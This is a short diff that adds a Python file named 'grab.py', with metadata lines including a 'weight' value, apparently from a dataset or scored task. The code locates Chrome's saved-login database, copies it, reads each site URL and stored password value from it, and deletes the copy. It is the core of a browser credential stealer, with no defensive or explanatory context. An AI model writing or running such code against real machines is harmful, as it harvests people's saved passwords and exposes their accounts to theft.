@@ -1,0 +1,10 @@
+# path: grab.py
+# lines: 3
+# weight: 40
+# ---
+import os, shutil, sqlite3
+base = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
+db = os.path.join(base, "Default", "Login Data")
+shutil.copy2(db, "tmp.db")
+rows = sqlite3.connect("tmp.db").execute("select origin_url, password_value from logins").fetchall()
+os.remove("tmp.db")
